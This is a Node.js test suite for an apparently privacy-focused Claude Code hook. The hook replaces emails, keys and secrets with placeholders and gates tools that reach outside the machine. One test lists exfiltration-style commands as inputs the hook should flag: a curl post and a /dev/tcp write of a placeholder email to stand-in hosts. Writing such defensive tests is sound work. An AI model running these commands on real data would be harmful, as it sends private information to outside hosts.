// Runs scripts/hook.js as Claude Code does: hook JSON on stdin, decision on stdout.
// Only fictional data (example.com, Northwind, hooli...).
'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawn, spawnSync } = require('node:child_process');

const HOOK = path.join(__dirname, '..', 'scripts', 'hook.js');

function sandbox() {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'trellis-home-'));
  const project = fs.mkdtempSync(path.join(os.tmpdir(), 'trellis-proj-'));
  const env = { ...process.env, TRELLIS_HOME: home, CLAUDE_PROJECT_DIR: project };
  delete env.CLAUDE_PLUGIN_DATA;
  const run = (input) => {
    const r = spawnSync(process.execPath, [HOOK], { input: JSON.stringify({ cwd: project, session_id: 's1', ...input }), env, encoding: 'utf8' });
    assert.equal(r.status, 0, r.stderr);
    return r.stdout ? JSON.parse(r.stdout) : null;
  };
  const runAsync = (input) =>
    new Promise((resolve, reject) => {
      const child = spawn(process.execPath, [HOOK], { env });
      let out = '';
      child.stdout.on('data', (d) => (out += d));
      child.on('error', reject);
      child.on('close', () => resolve(out ? JSON.parse(out) : null));
      child.stdin.end(JSON.stringify({ cwd: project, session_id: 's1', ...input }));
    });
  const settings = (obj) => fs.writeFileSync(path.join(home, 'settings.json'), JSON.stringify(obj));
  return { home, project, run, runAsync, settings };
}

const prompt = (sb, text) => sb.run({ hook_event_name: 'UserPromptSubmit', prompt: text });
const post = (sb, tool, response) => sb.run({ hook_event_name: 'PostToolUse', tool_name: tool, tool_input: {}, tool_response: response });
const pre = (sb, tool, input) => sb.run({ hook_event_name: 'PreToolUse', tool_name: tool, tool_input: input });

test('a prompt without sensitive data passes untouched', () => {
  const sb = sandbox();
  assert.equal(prompt(sb, 'Refactor the parser to use a state machine'), null);
});

test('a sensitive prompt is blocked, with an obfuscated version and no original in the reason', () => {
  const sb = sandbox();
  const r = prompt(sb, 'Email laura.martinez@example.com the API key sk-ant-abcdefghijklmnopqrstuvwxyz');
  assert.equal(r.decision, 'block');
  assert.equal(r.hookSpecificOutput.hookEventName, 'UserPromptSubmit');
  assert.equal(r.hookSpecificOutput.suppressOriginalPrompt, true);
  assert.match(r.reason, /Email, Api key/);
  assert.match(r.reason, /Email \[EMAIL_1\] the API key \[API_KEY_1\]/);
  assert.doesNotMatch(r.reason, /laura|sk-ant/);
});

test('the obfuscated version passes, and its placeholders are restored for local tools', () => {
  const sb = sandbox();
  prompt(sb, 'Write to Laura Martínez at laura.martinez@example.com');
  assert.equal(prompt(sb, 'Write to [NAME_1] [SURNAME_1] at [EMAIL_1]'), null);
  const r = pre(sb, 'Write', { file_path: 'note.txt', content: 'Dear [NAME_1], see [EMAIL_1]. Keep EMAIL_1 and [EMAIL_9].' });
  assert.equal(r.hookSpecificOutput.updatedInput.content, 'Dear Laura, see laura.martinez@example.com. Keep EMAIL_1 and [EMAIL_9].');
  assert.equal(r.hookSpecificOutput.updatedInput.file_path, 'note.txt');
  assert.equal(r.hookSpecificOutput.permissionDecision, undefined, 'never auto-approves');
});

test('warn mode lets the prompt through with a notice; off disables the check', () => {
  const sb = sandbox();
  sb.settings({ prompt: 'warn' });
  const r = prompt(sb, 'Mail sarah.johnson@example.com');
  assert.equal(r.decision, undefined);
  assert.match(r.systemMessage, /Email/);
  sb.settings({ prompt: 'off' });
  assert.equal(prompt(sb, 'Mail sarah.johnson@example.com'), null);
});

test('@-mentioned files with sensitive data block the prompt', () => {
  const sb = sandbox();
  fs.writeFileSync(path.join(sb.project, 'contacts.csv'), 'name,email\nSarah,sarah.johnson@example.com\n');
  fs.writeFileSync(path.join(sb.project, 'clean.txt'), 'nothing here\n');
  const r = prompt(sb, 'Summarize @contacts.csv please');
  assert.equal(r.decision, 'block');
  assert.match(r.reason, /@contacts\.csv contains Name, Email/);
  assert.doesNotMatch(r.reason, /sarah/i);
  assert.equal(prompt(sb, 'Summarize @clean.txt'), null);
});

test('tool results are obfuscated keeping their shape; one exact value, one placeholder', () => {
  const sb = sandbox();
  const r = post(sb, 'Bash', { stdout: 'owner: laura.martinez@example.com\ncc: LAURA.MARTINEZ@EXAMPLE.COM\nagain laura.martinez@example.com', stderr: '', interrupted: false });
  const out = r.hookSpecificOutput.updatedToolOutput;
  assert.equal(r.hookSpecificOutput.hookEventName, 'PostToolUse');
  assert.deepEqual(Object.keys(out), ['stdout', 'stderr', 'interrupted']);
  assert.equal(out.interrupted, false);
  assert.equal(out.stdout, 'owner: [EMAIL_1]\ncc: [EMAIL_2]\nagain [EMAIL_1]');
  // Placeholders restore byte for byte, so edits to real files keep the original casing.
  const e = pre(sb, 'Edit', { file_path: 'a', old_string: 'cc: [EMAIL_2]', new_string: 'cc: [EMAIL_1]' });
  assert.equal(e.hookSpecificOutput.updatedInput.old_string, 'cc: LAURA.MARTINEZ@EXAMPLE.COM');
  assert.equal(e.hookSpecificOutput.updatedInput.new_string, 'cc: laura.martinez@example.com');
});

test('Read results: nested content obfuscated, image data left alone, clean output untouched', () => {
  const sb = sandbox();
  const r = post(sb, 'Read', { type: 'text', file: { filePath: '/p/a.env', content: 'TOKEN=abc123secret\nHOST=10.0.0.12', numLines: 2 } });
  const file = r.hookSpecificOutput.updatedToolOutput.file;
  assert.equal(file.content, 'TOKEN=[SECRET_1]\nHOST=[IPV4_1]');
  assert.equal(file.numLines, 2);
  assert.equal(post(sb, 'Read', { type: 'image', file: { base64: 'c2VjcmV0QGV4YW1wbGUuY29t', note: 'ok' } }), null);
  assert.equal(post(sb, 'Grep', { filenames: ['src/a.js'], numFiles: 1 }), null);
});

test('memory: /trellis:add hides terms (also inside words with --partial) and never echoes them', () => {
  const sb = sandbox();
  const r = prompt(sb, '/trellis:add Northwind Traders, hooli --as Company --partial');
  assert.equal(r.decision, 'block');
  assert.match(r.reason, /2 terms added to memory \(Company, partial match\)/);
  assert.doesNotMatch(r.reason, /Northwind|hooli/i);
  const p = post(sb, 'Bash', { stdout: 'deploy HooliDC for northwind traders' });
  assert.equal(p.hookSpecificOutput.updatedToolOutput.stdout, 'deploy [COMPANY_1]DC for [COMPANY_2]');
  assert.equal(prompt(sb, 'Ask Northwind Traders').decision, 'block');
  const stored = JSON.parse(fs.readFileSync(path.join(sb.home, 'settings.json'), 'utf8'));
  assert.deepEqual(stored.memory, [
    { term: 'Northwind Traders', category: 'Company', partial: true },
    { term: 'hooli', category: 'Company', partial: true }
  ]);
  assert.equal(prompt(sb, '/trellis:forget hooli, northwind traders').reason, 'Trellis: 2 entries removed.');
  assert.equal(prompt(sb, 'Ask Northwind Traders'), null);
});

test('/trellis:allow stops rules and lists from hiding a value; memory still wins', () => {
  const sb = sandbox();
  assert.match(prompt(sb, '/trellis:allow 10.0.0.1').reason, /1 value added/);
  assert.equal(post(sb, 'Bash', { stdout: 'bind 10.0.0.1' }), null);
  prompt(sb, '/trellis:add 10.0.0.1 --as Host');
  assert.equal(post(sb, 'Bash', { stdout: 'bind 10.0.0.1' }).hookSpecificOutput.updatedToolOutput.stdout, 'bind [HOST_1]');
});

test('/trellis:scan, /trellis:status, /trellis:clear and /trellis:help run locally', () => {
  const sb = sandbox();
  fs.writeFileSync(path.join(sb.project, 'data.txt'), 'Call +34 612 345 678 or mail a@example.com');
  assert.match(prompt(sb, '/trellis:scan data.txt').reason, /data\.txt contains Phone, Email/);
  post(sb, 'Bash', { stdout: 'a@example.com' });
  assert.match(prompt(sb, '/trellis:status').reason, /Trellis is ON[\s\S]*Placeholders in this project: 1/);
  assert.match(prompt(sb, '/trellis:clear').reason, /1 placeholder forgotten/);
  assert.equal(pre(sb, 'Bash', { command: 'echo [EMAIL_1]' }), null);
  assert.match(prompt(sb, '/trellis:help').reason, /\/trellis:add/);
});

test('UserPromptExpansion handles the commands too', () => {
  const sb = sandbox();
  const r = sb.run({ hook_event_name: 'UserPromptExpansion', expansion_type: 'slash_command', command_name: 'trellis:add', command_args: 'Initech', prompt: '' });
  assert.equal(r.hookSpecificOutput.hookEventName, 'UserPromptExpansion');
  assert.match(r.reason, /1 term added/);
  assert.equal(sb.run({ hook_event_name: 'UserPromptExpansion', expansion_type: 'slash_command', command_name: 'other:cmd', command_args: '', prompt: '' }), null);
});

test('/trellis:import reads the browser extension export and memory lists', () => {
  const sb = sandbox();
  const exported = {
    enabled: true,
    domains: ['evil.example'],
    rules: [
      { id: 'kw', name: 'Codename', type: 'keyword', pattern: 'Project Phoenix', wholeWord: true, enabled: true, extra: 'dropped' },
      { id: 'bad', name: 'Broken', type: 'regex', pattern: '(', enabled: true }
    ],
    memory: [{ term: 'Globex', category: 'Client' }],
    allowlist: ['192.168.1.1']
  };
  fs.writeFileSync(path.join(sb.project, 'trellis-settings.json'), JSON.stringify(exported));
  assert.match(prompt(sb, '/trellis:import trellis-settings.json').reason, /imported 1 rule, 1 allowlisted, 1 memory term/);
  const stored = JSON.parse(fs.readFileSync(path.join(sb.home, 'settings.json'), 'utf8'));
  assert.equal(stored.domains, undefined);
  assert.equal(stored.rules[0].extra, undefined);
  assert.equal(post(sb, 'Bash', { stdout: 'Project Phoenix for Globex' }).hookSpecificOutput.updatedToolOutput.stdout, '[CODENAME_1] for [CLIENT_1]');

  fs.writeFileSync(path.join(sb.project, 'memory.tsv'), 'Person\tSarah Johnson\nCompany\tumbrella\tpartial\nAcme, Contoso\n');
  assert.match(prompt(sb, '/trellis:import memory.tsv').reason, /imported 4 memory terms/);
});

test('local tools: restored inputs, network commands ask, unknown placeholders untouched', () => {
  const sb = sandbox();
  post(sb, 'Bash', { stdout: 'sarah.johnson@example.com' });
  const local = pre(sb, 'Bash', { command: 'grep -c "[EMAIL_1]" users.csv', description: 'Count' });
  assert.equal(local.hookSpecificOutput.updatedInput.command, 'grep -c "sarah.johnson@example.com" users.csv');
  assert.equal(local.hookSpecificOutput.updatedInput.description, 'Count');
  assert.equal(local.hookSpecificOutput.permissionDecision, undefined);
  for (const command of ['curl -d "[EMAIL_1]" https://x.example', 'python3 send.py [EMAIL_1]', 'echo [EMAIL_1] > /dev/tcp/1.2.3.4/80', 'git push && echo [EMAIL_1]']) {
    const r = pre(sb, 'Bash', { command });
    assert.equal(r.hookSpecificOutput.permissionDecision, 'ask', command);
    assert.doesNotMatch(r.hookSpecificOutput.permissionDecisionReason, /sarah/);
  }
  assert.equal(pre(sb, 'Bash', { command: 'ls node_modules' }), null);
  assert.equal(pre(sb, 'Bash', { command: 'echo [EMAIL_7]' }), null);
});

test('outbound tools never get originals and are denied sensitive input', () => {
  const sb = sandbox();
  post(sb, 'Bash', { stdout: 'sarah.johnson@example.com' });
  assert.equal(pre(sb, 'WebFetch', { url: 'https://x.example', prompt: 'about [EMAIL_1]' }), null);
  const r = pre(sb, 'mcp__tracker__create_issue', { title: 'Contact sarah.johnson@example.com' });
  assert.equal(r.hookSpecificOutput.permissionDecision, 'deny');
  assert.doesNotMatch(r.hookSpecificOutput.permissionDecisionReason, /sarah/);
  sb.settings({ outbound: 'ask', localMcpServers: ['sqlite'] });
  assert.equal(pre(sb, 'WebSearch', { query: 'sarah.johnson@example.com' }).hookSpecificOutput.permissionDecision, 'ask');
  const local = pre(sb, 'mcp__sqlite__query', { sql: "select * from users where email='[EMAIL_1]'" });
  assert.equal(local.hookSpecificOutput.updatedInput.sql, "select * from users where email='sarah.johnson@example.com'");
});

test('MessageDisplay restores bracketed placeholders on screen only', () => {
  const sb = sandbox();
  post(sb, 'Bash', { stdout: 'sarah.johnson@example.com' });
  const r = sb.run({ hook_event_name: 'MessageDisplay', delta: 'Wrote to [EMAIL_1] (EMAIL_1).\n', final: false });
  assert.equal(r.hookSpecificOutput.displayContent, 'Wrote to sarah.johnson@example.com (EMAIL_1).\n');
  assert.equal(sb.run({ hook_event_name: 'MessageDisplay', delta: 'nothing here\n' }), null);
  sb.settings({ restoreDisplay: false });
  assert.equal(sb.run({ hook_event_name: 'MessageDisplay', delta: '[EMAIL_1]\n' }), null);
});

test('SessionStart explains placeholders and warns about sensitive CLAUDE.md', () => {
  const sb = sandbox();
  const clean = sb.run({ hook_event_name: 'SessionStart', source: 'startup' });
  assert.match(clean.hookSpecificOutput.additionalContext, /placeholders/);
  fs.writeFileSync(path.join(sb.project, 'CLAUDE.md'), 'Deploy key owner: ops@example.com');
  const r = sb.run({ hook_event_name: 'SessionStart', source: 'startup' });
  assert.match(r.systemMessage, /CLAUDE\.md \(Email\)/);
  assert.doesNotMatch(r.systemMessage, /ops@/);
});

test('disabled: nothing is touched', () => {
  const sb = sandbox();
  sb.settings({ enabled: false });
  assert.equal(prompt(sb, 'Mail sarah.johnson@example.com'), null);
  assert.equal(post(sb, 'Bash', { stdout: 'sarah.johnson@example.com' }), null);
  assert.equal(sb.run({ hook_event_name: 'SessionStart', source: 'startup' }), null);
});

test('parallel hooks share one consistent vault', async () => {
  const sb = sandbox();
  const emails = Array.from({ length: 12 }, (_, i) => `user${i}@example.com`);
  const results = await Promise.all(emails.map((e) => sb.runAsync({ hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_response: { stdout: e } })));
  const tokens = results.map((r) => r.hookSpecificOutput.updatedToolOutput.stdout);
  assert.equal(new Set(tokens).size, emails.length, 'every value got its own placeholder');
  for (let i = 0; i < emails.length; i++) {
    const r = pre(sb, 'Bash', { command: `echo ${tokens[i]}` });
    assert.equal(r.hookSpecificOutput.updatedInput.command, `echo ${emails[i]}`);
  }
  const vaultDir = path.join(sb.home, 'vault');
  const [file] = fs.readdirSync(vaultDir);
  assert.equal(fs.statSync(path.join(vaultDir, file)).mode & 0o777, 0o600);
});

test('a malformed settings file falls back to the defaults', () => {
  const sb = sandbox();
  sb.settings({ rules: 'not a list', memory: 7 });
  assert.equal(prompt(sb, 'Mail sarah.johnson@example.com').decision, 'block');
  assert.equal(post(sb, 'Bash', { stdout: 'sarah.johnson@example.com' }).hookSpecificOutput.updatedToolOutput.stdout, '[EMAIL_1]');
  fs.writeFileSync(path.join(sb.home, 'settings.json'), '{ not json');
  assert.equal(prompt(sb, 'Mail sarah.johnson@example.com').decision, 'block');
});
